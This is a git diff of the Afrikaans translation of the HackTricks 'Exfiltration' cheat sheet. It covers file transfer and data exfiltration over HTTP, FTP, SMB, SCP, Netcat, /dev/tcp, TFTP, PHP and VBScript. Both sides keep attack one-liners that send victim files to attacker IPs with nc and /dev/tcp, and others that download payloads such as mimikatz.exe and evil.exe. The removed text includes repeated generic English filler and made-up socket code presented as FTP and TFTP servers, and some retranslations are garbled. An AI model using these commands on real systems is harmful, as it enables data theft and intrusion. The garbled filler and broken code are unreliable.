@@ -1,4 +1,4 @@
-# Uitleiding
+# Uitlekking
 
 <details>
 
@@ -6,23 +6,15 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repositoriums.
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regstel. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-## Gewoonlik toegelate domeine om inligting uit te voer
+## Gewoonlik toegelate domeine om inligting uit te lek
 
 Kyk na [https://lots-project.com/](https://lots-project.com/) om gewoonlik toegelate domeine te vind wat misbruik kan word
 
@@ -34,60 +26,11 @@ base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
 **Windows**
-
-# Exfiltration
-
-## Introduction
-
-Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of hacking, exfiltration is often used to steal sensitive information or to maintain persistence within a compromised network.
-
-## Techniques
-
-### 1. File Transfer Protocol (FTP)
-
-FTP is a standard network protocol used for transferring files between a client and a server. Attackers can use FTP to exfiltrate data by connecting to an FTP server and uploading the stolen files.
-
-### 2. Hypertext Transfer Protocol (HTTP)
-
-HTTP is the protocol used for transmitting data over the internet. Attackers can use HTTP to exfiltrate data by sending HTTP requests to a remote server, either by embedding the data in the request or by uploading files.
-
-### 3. Domain Name System (DNS)
-
-DNS is responsible for translating domain names into IP addresses. Attackers can use DNS exfiltration to encode and send data within DNS queries or responses, bypassing traditional network security measures.
-
-### 4. Email
-
-Attackers can exfiltrate data by sending it as email attachments or by using steganography techniques to hide the data within the email content.
-
-### 5. Cloud Storage
-
-Attackers can use cloud storage services, such as Dropbox or Google Drive, to exfiltrate data by uploading the stolen files to the cloud and accessing them from a different location.
-
-### 6. Remote Desktop Protocol (RDP)
-
-RDP allows users to connect to and control a remote computer over a network connection. Attackers can use RDP to exfiltrate data by transferring files from the compromised system to the attacker's machine.
-
-### 7. USB Devices
-
-Attackers can physically connect USB devices to a target system to exfiltrate data. This can be done by copying files directly to the USB device or by using specialized tools that automatically exfiltrate data when the device is connected.
-
-## Countermeasures
-
-To prevent exfiltration attacks, organizations should implement the following countermeasures:
-
-- Implement network segmentation to restrict unauthorized access to sensitive data.
-- Use encryption to protect data in transit.
-- Monitor network traffic for suspicious activity.
-- Implement data loss prevention (DLP) solutions to detect and prevent unauthorized data transfers.
-- Regularly update and patch software to address known vulnerabilities.
-- Educate employees about the risks of exfiltration and the importance of following security best practices.
-
-By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
-### HTTP
+## HTTP
 
 **Linux**
 ```bash
@@ -97,54 +40,6 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
 **Windows**
-
-# Exfiltration
-
-## Introduction
-
-Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of hacking, exfiltration is often used to steal sensitive information or to maintain persistence within a compromised network.
-
-## Techniques
-
-### 1. File Transfer Protocol (FTP)
-
-FTP is a standard network protocol used for transferring files between a client and a server. Attackers can use FTP to exfiltrate data by connecting to an FTP server and uploading the stolen files.
-
-### 2. Hypertext Transfer Protocol (HTTP)
-
-HTTP is the protocol used for transmitting data over the internet. Attackers can use HTTP to exfiltrate data by sending HTTP requests to a remote server, either by embedding the data in the request or by uploading files.
-
-### 3. Domain Name System (DNS)
-
-DNS is responsible for translating domain names into IP addresses. Attackers can use DNS exfiltration to encode and send data within DNS queries or responses, bypassing traditional network security measures.
-
-### 4. Email
-
-Attackers can exfiltrate data by sending it as email attachments or by using steganography techniques to hide the data within the email content.
-
-### 5. Cloud Storage
-
-Attackers can use cloud storage services, such as Dropbox or Google Drive, to exfiltrate data by uploading the stolen files to the cloud and accessing them from a different location.
-
-### 6. Remote Desktop Protocol (RDP)
-
-RDP allows users to connect to and control a remote computer over a network connection. Attackers can use RDP to exfiltrate data by transferring files from the compromised system to the attacker's machine.
-
-### 7. USB Devices
-
-Attackers can physically connect USB devices to a target system to exfiltrate data. This can be done by copying files directly to the USB device or by using specialized tools to extract data from the system.
-
-## Countermeasures
-
-To prevent exfiltration attacks, organizations can implement the following countermeasures:
-
-- Implement network segmentation to restrict access between different parts of the network.
-- Use data loss prevention (DLP) solutions to monitor and control the flow of sensitive data.
-- Employ intrusion detection and prevention systems (IDS/IPS) to detect and block exfiltration attempts.
-- Regularly update and patch software to fix vulnerabilities that could be exploited for exfiltration.
-- Train employees on security best practices and the risks associated with exfiltration.
-
-By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -162,8 +57,8 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Laai lêers op
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer druk GET en POSTs (ook koppe)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Python-module [uploadserver](https://pypi.org/project/uploadserver/):
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -177,8 +72,6 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
 ### **HTTPS-bediener**
-
-'n HTTPS-bediener is 'n bediener wat gebruik maak van die HTTPS-protokol vir veilige kommunikasie. Dit maak gebruik van SSL/TLS-sertifikate om die kommunikasie tussen die bediener en die kliënt te versleutel en te verseker dat die data veilig oorgedra word. 'n HTTPS-bediener word dikwels gebruik vir die hantering van sensitiewe inligting, soos persoonlike besonderhede, finansiële transaksies en ander vertroulike data. Dit is belangrik om 'n veilige en betroubare HTTPS-bediener te hê om die risiko van datalekke en aanvalle te verminder.
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -222,152 +115,16 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ## FTP
 
 ### FTP-bediener (python)
-
-```python
-import socket
-import os
-
-def send_file(file_path, host, port):
-    # Verbind met die bediener
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
-
-    # Stuur die lêerinhoud na die bediener
-    with open(file_path, 'rb') as file:
-        data = file.read(1024)
-        while data:
-            s.send(data)
-            data = file.read(1024)
-
-    # Sluit die verbinding
-    s.close()
-
-def receive_file(file_path, host, port):
-    # Luister vir inkomende verbindings
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((host, port))
-    s.listen(1)
-
-    # Aanvaar die verbindin
-    conn, addr = s.accept()
-
-    # Ontvang die lêerinhoud van die kliënt
-    with open(file_path, 'wb') as file:
-        data = conn.recv(1024)
-        while data:
-            file.write(data)
-            data = conn.recv(1024)
-
-    # Sluit die verbinding
-    conn.close()
-    s.close()
-```
-
-Hierdie kode demonstreer hoe om 'n eenvoudige FTP-bediener in Python te skep. Die `send_file`-funksie stuur 'n lêer na die bediener, terwyl die `receive_file`-funksie 'n lêer van die bediener ontvang.
-
-Om 'n lêer na die bediener te stuur, moet jy die `send_file`-funksie oproep en die volledige pad na die lêer, die bediener se IP-adres en die poortnommer as argumente verskaf. Byvoorbeeld:
-
-```python
-send_file('/pad/na/lêer.txt', '192.168.0.100', 21)
-```
-
-Om 'n lêer van die bediener te ontvang, moet jy die `receive_file`-funksie oproep en die volledige pad na die lêer, die IP-adres van die bediener en die poortnommer as argumente verskaf. Byvoorbeeld:
-
-```python
-receive_file('/pad/na/lêer.txt', '192.168.0.100', 21)
-```
-
-Merk op dat jy die poortnommer moet spesifiseer wat deur die FTP-bediener gebruik word. Die standaardpoort vir FTP is 21.
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
 ### FTP-bediener (NodeJS)
-
-Hierdie gedeelte beskryf 'n metode om data uit te voer deur gebruik te maak van 'n FTP-bediener wat in NodeJS geïmplementeer is.
-
-#### Stap 1: Installeer die nodige afhanklikhede
-
-Om die FTP-bediener in NodeJS te gebruik, moet jy die nodige afhanklikhede installeer. Voer die volgende opdrag in die opdraglyn uit:
-
-```bash
-npm install ftp
-```
-
-#### Stap 2: Skryf die kode
-
-Maak 'n nuwe JavaScript-lêer en voeg die volgende kode daarby:
-
-```javascript
-const ftp = require('ftp');
-
-// Verbind met die FTP-bediener
-const client = new ftp();
-client.connect({
-    host: 'ftp.example.com',
-    user: 'username',
-    password: 'password'
-});
-
-// Wanneer die verbinding suksesvol is
-client.on('ready', () => {
-    // Laai die lêer op na die bediener
-    client.put('local_file.txt', 'remote_file.txt', (err) => {
-        if (err) throw err;
-        console.log('Lêer suksesvol opgelaai na die bediener');
-        client.end(); // Sluit die verbinding
-    });
-});
-```
-
-#### Stap 3: Voer die kode uit
-
-Voer die volgende opdrag in die opdraglyn uit om die kode uit te voer:
-
-```bash
-node filename.js
-```
-
-Vervang `filename.js` met die naam van jou JavaScript-lêer.
-
-Die kode sal die lêer `local_file.txt` na die FTP-bediener oplaai as `remote_file.txt`. As die operasie suksesvol is, sal die boodskap "Lêer suksesvol opgelaai na die bediener" gedruk word.
-
-Dit is 'n eenvoudige manier om data uit te voer deur gebruik te maak van 'n FTP-bediener in NodeJS. Onthou om die nodige veiligheidsmaatreëls te tref om ongemagtigde toegang tot die bediener te voorkom.
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
 ### FTP-bediener (pure-ftp)
-
-#### Inleiding
-
-FTP (File Transfer Protocol) is 'n protokol wat gebruik word vir die oordrag van lêers tussen rekenaars op 'n netwerk. Dit maak gebruik van 'n bediener-kliënt-arkitektuur, waar die bediener die lêers hou en die kliënt die lêers kan aflaai of oplaai.
-
-#### Pure-FTP
-
-Pure-FTP is 'n vinnige en veilige FTP-bedieningsagteware wat gebruik kan word om 'n FTP-bediener op te stel. Dit is 'n gewilde keuse vir die opstel van 'n privaat of openbare FTP-bediener.
-
-#### Uitfiltering van data
-
-Die uitfiltering van data van 'n FTP-bediener kan 'n nuttige tegniek wees vir die verkryging van gevoelige inligting. Hier is 'n paar metodes wat gebruik kan word om data uit te filter:
-
-1. **Lêeroplaaiing**: Deur 'n kwaadwillige lêer op die FTP-bediener op te laai, kan 'n aanvaller toegang verkry tot die bediener en die inhoud daarvan ondersoek.
-2. **Lêeraflaaiing**: Deur 'n lêer van die FTP-bediener af te laai, kan 'n aanvaller gevoelige inligting verkry wat op die bediener gestoor word.
-3. **Lêeruitvoering**: As die FTP-bediener die uitvoering van lêers toelaat, kan 'n aanvaller 'n kwaadwillige lêer op die bediener plaas en dit uitvoer om toegang tot die bediener te verkry.
-
-#### Voorkoming van data-uitfiltering
-
-Om die risiko van data-uitfiltering van 'n FTP-bediener te verminder, kan die volgende maatreëls geneem word:
-
-1. **Sterk wagwoorde**: Stel sterk wagwoorde in vir die FTP-bediener en vermy die gebruik van maklik raadbare wagwoorde.
-2. **Toegangsbeheer**: Beperk die toegang tot die FTP-bediener deur slegs geakkrediteerde gebruikers toe te laat.
-3. **Versleuteling**: Gebruik versleuteling om die oordrag van data tussen die kliënt en die bediener te beskerm.
-4. **Besoekbeperkings**: Beperk die toegang tot die FTP-bediener deur slegs spesifieke IP-adresse toe te laat.
-5. **Opdaterings en patches**: Verseker dat die FTP-bedieningsagteware opgedateer word met die nuutste opdaterings en patches om bekende kwesbaarhede te vermy.
-
-#### Gevolgtrekking
-
-Die uitfiltering van data van 'n FTP-bediener kan 'n effektiewe tegniek wees vir die verkryging van gevoelige inligting. Dit is belangrik om die nodige maatreëls te tref om die risiko van data-uitfiltering te verminder en die veiligheid van die FTP-bediener te verseker.
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -396,14 +153,6 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe bedreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## SMB
 
 Kali as bediener
@@ -413,7 +162,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb-deel **deur samba te gebruik**:
+Of skep 'n smb-aandeel **met behulp van samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -428,48 +177,19 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltrasie
+### Exfiltration
 
-## Inleiding
+Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
 
-Exfiltrasie is die proses waardeur 'n aanvaller gesteelde data uit 'n teikenstelsel verwyder en oordra na 'n eksterne bediener of stoorplek. Hierdie tegniek word dikwels gebruik deur aanvallers om gevoelige inligting te ontvreem, soos kredietkaartbesonderhede, wagwoorde, persoonlike inligting en vertroulike dokumente.
+- **Email**: Sending data as email attachments.
+- **FTP**: Transferring data using the File Transfer Protocol.
+- **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
+- **DNS**: Encoding data within DNS queries.
+- **Steganography**: Hiding data within images or other files.
+- **Cloud Storage**: Uploading data to cloud storage services.
+- **Physical Media**: Copying data to removable media like USB drives.
 
-## Metodes van Exfiltrasie
-
-### 1. Bestandsoordrag
-
-Hierdie metode behels die oordra van gesteelde data deur dit in 'n bestand te verpak en dit dan oor te dra na 'n eksterne bediener. Dit kan gedoen word deur gebruik te maak van protokolle soos HTTP, FTP, SMB of SMTP.
-
-### 2. Versteekte data in beeldlêers
-
-Aanvallers kan data versteek in beeldlêers deur dit te versluier en dan as 'n normale beeldlêer te laat voorkom. Hierdie metode maak gebruik van steganografie, wat die kunst is om data te versteek binne 'n ander tipe lêer sonder om die oorspronklike lêer te beskadig.
-
-### 3. Gebruik van DNS
-
-Aanvallers kan DNS-kanale gebruik om gesteelde data te exfiltreer. Hierdie metode behels die gebruik van DNS-navrae om data te verpak en oor te dra na 'n eksterne bediener. Dit kan gedoen word deur die DNS-navrae te manipuleer en die gesteelde data as deel van die DNS-navrae te versluier.
-
-### 4. Gebruik van uitvoerbare lêers
-
-Aanvallers kan gesteelde data in 'n uitvoerbare lêer insluit en dit dan oor te dra na 'n eksterne bediener. Hierdie metode maak gebruik van die uitvoerbare lêer se funksionaliteit om die gesteelde data te verpak en oor te dra.
-
-### 5. Gebruik van e-pos
-
-Aanvallers kan gesteelde data as 'n e-posaanhangsel stuur na 'n eksterne e-posrekening. Hierdie metode maak gebruik van die e-posprotokol om die gesteelde data te verpak en oor te dra.
-
-## Voorkoming van Exfiltrasie
-
-Om exfiltrasie te voorkom, kan die volgende maatreëls geneem word:
-
-- Monitor die netwerkverkeer vir verdagte aktiwiteit en ongewone data-oordragte.
-- Beperk die toegang tot gevoelige data en stel streng toegangsbeheerbeleide in.
-- Implementeer 'n firewall en gebruik netwerksegmentering om die verspreiding van gesteelde data te beperk.
-- Verseker dat alle sagteware en bedryfstelsels opgedateer word met die nuutste beveiligingspatches.
-- Stel 'n sterk wagwoordbeleid in en moedig gebruikers aan om unieke en veilige wagwoorde te gebruik.
-- Bewusmaking van gebruikers oor die risiko's van phishing-aanvalle en die deel van persoonlike inligting.
-
-## Slotwoord
-
-Exfiltrasie is 'n kritieke bedreiging vir die veiligheid van data en moet ernstig opgeneem word. Deur bewus te wees van die verskillende metodes van exfiltrasie en deur die nodige voorkomingsmaatreëls te tref, kan organisasies hulself beskerm teen hierdie aanvalstegniek.
+Exfiltration can be a critical phase in an attack, as it allows threat actors to steal valuable information from the target system. It is essential for defenders to monitor and control outbound network traffic to detect and prevent exfiltration attempts.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -479,13 +199,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Die aanvaller moet SSHd laat loop.
+Die aanvaller moet SSHd aan die gang hê.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-As die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller se rekenaar koppel.
+Indien die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller se stelsel koppel.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -493,73 +213,37 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC (Netcat) is a versatile networking utility that can be used for various purposes, including exfiltration of data. It allows for easy creation of TCP or UDP connections between two machines, making it a useful tool for transferring data from a compromised system to an external server.
+### Netcat
 
-To exfiltrate data using NC, you can follow these steps:
+Netcat is a versatile networking utility that can be used for various purposes, including transferring files between systems. It can be used to create a simple backdoor on a target system to exfiltrate data.
 
-1. Set up a listener on the external server using the following command:
-   ```
-   nc -l -p <port> > <output_file>
-   ```
-   Replace `<port>` with the desired port number and `<output_file>` with the name of the file where the data will be saved.
+#### Usage
 
-2. On the compromised system, use the following command to send the data to the external server:
-   ```
-   nc <server_ip> <port> < <input_file>
-   ```
-   Replace `<server_ip>` with the IP address of the external server, `<port>` with the same port number used in the listener, and `<input_file>` with the name of the file containing the data to be exfiltrated.
+To exfiltrate data using Netcat, you can set up a listener on the attacker machine and send data from the target machine to the listener. Here's an example:
 
-3. Once the command is executed, the data will be transferred from the compromised system to the external server and saved in the specified output file.
+On the attacker machine:
+```bash
+nc -lvp 1234 > received_data.txt
+```
 
-NC can also be used in combination with other tools and techniques to enhance exfiltration capabilities. For example, you can compress the data before sending it using NC, or encrypt it to ensure confidentiality during transit.
+On the target machine:
+```bash
+nc <attacker_ip> 1234 < sensitive_data.txt
+```
 
-It is important to note that exfiltration of data without proper authorization is illegal and unethical. This information is provided for educational purposes only, and should not be used for any malicious activities.
+In this example, Netcat is used to send the contents of `sensitive_data.txt` from the target machine to the attacker machine, where it is saved as `received_data.txt`.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
+## /dev/tcp
+
 ### Laai lêer af van slagoffer
-
-Om 'n lêer van die slagoffer se stelsel af te laai, kan jy die `/dev/tcp`-benadering gebruik. Hier is die sintaksis:
-
-```bash
-cat < /dev/tcp/<IP>/<port> > <destination_file>
-```
-
-Vervang `<IP>` met die IP-adres van die slagoffer se stelsel en `<port>` met die poortnommer waarop die lêer beskikbaar is. Vervang ook `<destination_file>` met die pad en naam van die lêer waarin jy die aflaai wil stoor.
-
-Hier is 'n voorbeeld van hoe jy dit kan gebruik:
-
-```bash
-cat < /dev/tcp/192.168.0.100/8080 > /tmp/secret_file.txt
-```
-
-Hierdie opdrag sal die lêer `secret_file.txt` aflaai vanaf die stelsel met die IP-adres `192.168.0.100` op poort `8080` en dit stoor in die `/tmp`-gids.
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Laai lêer op na slagoffer
-
-Om 'n lêer na 'n slagoffer te laai, kan jy die volgende metodes gebruik:
-
-#### 1. HTTP-aanvraag
-
-Jy kan 'n HTTP-aanvraag stuur om die lêer na die slagoffer se bediener te stuur. Dit kan gedoen word deur die `POST`-metode te gebruik en die lêer as 'n vormdata te stuur. Die slagoffer se bediener moet die lêer aanvaar en stoor op 'n plek waar jy toegang daartoe het.
-
-#### 2. E-pos
-
-Jy kan die lêer as 'n aanhangsel in 'n e-pos stuur na 'n e-posadres wat deur die slagoffer gebruik word. Die slagoffer moet die e-pos ontvang en die aanhangsel aflaai. Dit vereis dat jy toegang het tot die slagoffer se e-posrekening of 'n manier het om die e-pos te onderskep.
-
-#### 3. Bestandsoordragprotokolle
-
-As jy toegang het tot die slagoffer se rekenaar of netwerk, kan jy gebruik maak van bestandsoordragprotokolle soos FTP, SFTP, SCP of SMB om die lêer na 'n plek te stuur waar jy toegang daartoe het. Hierdie metode vereis dat jy toegang het tot die slagoffer se rekenaar of netwerk en dat die nodige protokolle geïnstalleer en gekonfigureer is.
-
-#### 4. Cloud-gebaseerde dienste
-
-As die slagoffer gebruik maak van 'n wolkgebaseerde diens soos Google Drive, Dropbox of OneDrive, kan jy die lêer na die slagoffer se rekening oplaai. Dit vereis dat jy toegang het tot die slagoffer se rekening of 'n manier het om die toegangslegitimasie te bekom.
-
-Onthou, die laai van 'n lêer na 'n slagoffer se stelsel sonder hul toestemming is onwettig en word as 'n aanval beskou. Wees verantwoordelik en gebruik hierdie tegnieke slegs binne die raamwerk van wettige toetse of met toestemming van die eienaar van die stelsel.
+### Laai lêer na slagoffer op
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -594,7 +278,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Standaard in XP en 2003 (in ander moet dit eksplisiet bygevoeg word tydens installasie)
+Standaard in XP en 2003 (in ander moet dit uitdruklik tydens installasie bygevoeg word)
 
 In Kali, **begin TFTP-bediener**:
 ```bash
@@ -604,62 +288,6 @@ atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
 **TFTP-bediener in Python:**
-
-Hier is 'n eenvoudige implementering van 'n TFTP-bediener in Python. Hierdie kode kan gebruik word om 'n TFTP-bediener te skep wat bestandsoordragte kan hanteer.
-
-```python
-import socket
-import struct
-
-def tftp_server():
-    # Skep 'n UDP-socket
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    server_socket.bind(('0.0.0.0', 69))
-
-    print("TFTP-bediener is gereed om versoek te ontvang...")
-
-    while True:
-        # Ontvang die versoek en die klient se adres
-        data, client_address = server_socket.recvfrom(516)
-
-        # Haal die opcode uit die ontvangsdata
-        opcode = struct.unpack('!H', data[:2])[0]
-
-        # Kontroleer of dit 'n leesversoek is
-        if opcode == 1:
-            # Stuur die gewenste lêer terug na die klient
-            file_data = b'\x00\x03\x00\x01'
-            server_socket.sendto(file_data, client_address)
-
-        # Kontroleer of dit 'n skryfversoek is
-        elif opcode == 2:
-            # Ontvang die lêer van die klient
-            file_data, client_address = server_socket.recvfrom(516)
-
-            # Stoor die ontvangsdata in 'n lêer
-            with open('ontvangs.lêer', 'wb') as file:
-                file.write(file_data[4:])
-
-            # Bevestig die suksesvolle ontvangs aan die klient
-            ack_packet = b'\x00\x04\x00\x00'
-            server_socket.sendto(ack_packet, client_address)
-
-        # Kontroleer of dit 'n onbekende versoek is
-        else:
-            # Stuur 'n foute-pakket terug na die klient
-            error_packet = b'\x00\x05\x00\x04Unknown request\x00'
-            server_socket.sendto(error_packet, client_address)
-
-    # Sluit die bediener se socket
-    server_socket.close()
-
-# Begin die TFTP-bediener
-tftp_server()
-```
-
-Hierdie kode skep 'n UDP-socket en bind dit aan poort 69. Dit wag dan vir TFTP-versoeke van kliente. As 'n leesversoek ontvang word, stuur die bediener die gewenste lêer terug na die klient. As 'n skryfversoek ontvang word, ontvang die bediener die lêer van die klient en stoor dit in 'n lêer genaamd "ontvangs.lêer". As 'n onbekende versoek ontvang word, stuur die bediener 'n foute-pakket terug na die klient.
-
-Hierdie kode kan as 'n basis dien vir 'n eie TFTP-bediener-implementering in Python.
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -670,82 +298,13 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Laai 'n lêer af met 'n PHP eenregtelik:
+Laai 'n lêer af met 'n PHP eenlynige kode:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
 
-VBScript (Visual Basic Scripting Edition) is a scripting language developed by Microsoft. It is often used for automating tasks and creating dynamic web pages. VBScript is commonly used in Windows environments and can be executed using the Windows Script Host (WSH).
-
-### Basic Syntax
-
-VBScript code is written in plain text and saved with a .vbs file extension. Here is an example of a basic VBScript program:
-
-```vbs
-MsgBox "Hello, World!"
-```
-
-This code will display a message box with the text "Hello, World!" when executed.
-
-### Variables
-
-In VBScript, variables are used to store data. They can be declared using the `Dim` keyword. Here is an example:
-
-```vbs
-Dim name
-name = "John"
-```
-
-In this example, a variable named `name` is declared and assigned the value "John".
-
-### Control Structures
-
-VBScript supports various control structures, such as `If...Then...Else`, `For...Next`, and `Do...Loop`. These structures allow you to control the flow of your program based on certain conditions. Here is an example of an `If...Then...Else` statement:
-
-```vbs
-Dim age
-age = 18
-
-If age >= 18 Then
-    MsgBox "You are an adult."
-Else
-    MsgBox "You are a minor."
-End If
-```
-
-This code will display a message box based on the value of the `age` variable.
-
-### Functions
-
-VBScript provides built-in functions that can be used to perform various operations. For example, the `MsgBox` function is used to display a message box. Here is an example:
-
-```vbs
-MsgBox "Hello, World!"
-```
-
-This code will display a message box with the text "Hello, World!".
-
-### File Operations
-
-VBScript can also be used to perform file operations, such as reading from and writing to files. The `FileSystemObject` is used to interact with files and folders. Here is an example of reading from a file:
-
-```vbs
-Dim fso, file, text
-
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set file = fso.OpenTextFile("C:\path\to\file.txt", 1)
-text = file.ReadAll
-file.Close
-
-MsgBox text
-```
-
-This code will read the contents of the file "C:\path\to\file.txt" and display it in a message box.
-
-### Conclusion
-
-VBScript is a powerful scripting language that can be used for various tasks, including automation and web development. It provides a wide range of features and built-in functions that make it a versatile choice for Windows environments.
+VBScript is 'n skripsie taal wat deur Microsoft ontwikkel is en dikwels gebruik word vir Windows-gebaseerde skripsies en automatiseringstake. VBScript kan gebruik word vir die uitvoer van data exfiltration deur die gebruik van HTTP-aanvrae na 'n eksterne bediener. Hierdie tegniek kan gebruik word om gesteelde data na 'n aanvaller se beheerde bediener te stuur.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -783,13 +342,14 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program maak dit nie net moontlik om binêre lêers te ondersoek nie, maar het ook die **vermoë om hulle te herbou vanaf heks**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, `debug.exe` die binêre lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
+Die `debug.exe` program bied nie net die vermoë om binêre lêers te inspekteer nie, maar het ook die **vermoë om hulle vanaf heks te herbou**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kopieer en plak dan die teks in die Windows-skulp en 'n lêer genaamd nc.exe sal geskep word.
+```afrikaans
+Kopieer en plak dan die teks in die Windows-skootrekenaar en 'n lêer genaamd nc.exe sal geskep word.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
